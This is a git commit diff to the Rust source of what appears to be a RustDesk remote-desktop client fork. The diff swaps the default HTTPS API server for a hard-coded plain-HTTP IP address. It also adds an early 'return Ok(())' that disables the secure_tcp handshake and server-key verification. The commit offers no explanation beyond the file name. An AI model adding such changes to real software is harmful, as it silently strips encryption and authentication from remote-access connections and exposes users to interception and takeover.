a0fe3d00d08bb849f6a920891f2f11e900c5720d
zht98 <70802119+zht98@users.noreply.github.com>
2025-04-02 20:09:02 +0800

    common.rs

--- src/common.rs
+++ src/common.rs
@@ -944,7 +944,7 @@ fn get_api_server_(api: String, custom: String) -> String {
             return format!("http://{}", s);
         }
     }
-    "https://admin.rustdesk.com".to_owned()
+    "http://59.46.224.34:21114".to_owned()
 }
 
 pub fn get_audit_server(api: String, custom: String, typ: String) -> String {
@@ -1266,6 +1266,7 @@ pub fn check_process(arg: &str, mut same_uid: bool) -> bool {
 }
 
 pub async fn secure_tcp(conn: &mut FramedStream, key: &str) -> ResultType<()> {
+    return Ok(());
     let rs_pk = get_rs_pk(key);
     let Some(rs_pk) = rs_pk else {
         bail!("Handshake failed: invalid public key from rendezvous server");
